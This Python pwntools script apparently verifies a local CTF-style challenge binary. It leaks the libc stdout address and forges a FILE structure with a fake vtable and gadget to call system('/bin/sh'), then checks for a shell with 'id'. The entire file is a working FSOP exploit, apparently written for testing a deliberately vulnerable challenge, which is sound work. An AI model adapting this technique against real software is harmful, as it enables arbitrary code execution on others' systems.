#!/usr/bin/env python3
"""Verify fsop_shell_x64: byor-style; expect uid= in output."""

from __future__ import annotations

import os
import sys
from subprocess import STDOUT

from pwn import ELF, PIPE, FileStructure, context, p64, process, u64

context.arch = "amd64"
context.log_level = "error"


def main() -> int:
    root = os.path.join(os.path.dirname(__file__), "..")
    binary = os.path.abspath(os.path.join(root, "tests/challenges/fsop_shell_x64"))
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    if not os.path.isfile(binary) or not os.path.isfile(libc_path):
        print("need fsop_shell_x64 and system libc", file=sys.stderr)
        return 1

    libc = ELF(libc_path)
    # Merge stderr (menu/prompts) with stdout so one tube sees all I/O.
    p = process(binary, stdin=PIPE, stdout=PIPE, stderr=STDOUT)

    p.recvuntil(b"notes[0]  @ ")
    p.recvline()
    p.recvuntil(b"stdout    @ ")
    stdout_leak = int(p.recvline().strip(), 16)
    p.recvuntil(b"notes     @ ")
    p.recvline()
    p.recvuntil(b"> ")

    libc.address = stdout_leak - libc.sym["_IO_2_1_stdout_"]
    stdout = libc.sym["_IO_2_1_stdout_"]

    fake_vtable = libc.sym["_IO_wfile_jumps"] - 0x18
    stdout_lock = libc.sym["_IO_2_1_stdout_"] + 0x88

    needle = b"\x48\x83\xc7\x10\xff\xe1"
    off = open(libc_path, "rb").read().find(needle)
    if off < 0:
        print("gadget not found in libc", file=sys.stderr)
        p.close()
        return 1
    gadget = libc.address + off

    fake = FileStructure(0)
    fake.flags = 0x3B01010101010101
    fake._IO_read_end = libc.sym["system"]
    fake._IO_save_base = gadget
    fake._IO_write_end = u64(b"/bin/sh\x00".ljust(8, b"\x00"))
    fake.fileno = 1
    fake._lock = stdout_lock
    fake._codecvt = stdout + 0xB8
    fake.unknown2 = (p64(0) * 2 + p64(stdout + 0x20) + p64(0) * 3).ljust(48, b"\x00")[:48]
    fake.vtable = fake_vtable
    payload = bytes(fake)[:0x100]

    p.sendline(b"3")
    p.sendlineafter(b"index: ", b"0")
    p.send(payload.ljust(0x100, b"\x00"))
    p.recvuntil(b"> ")

    p.sendline(b"5")
    p.sendline(b"id")
    out = p.recvline(timeout=5)
    p.close()
    if b"uid=" in out:
        print("ok: shell (id)")
        return 0
    print("fail:", out[:200], file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
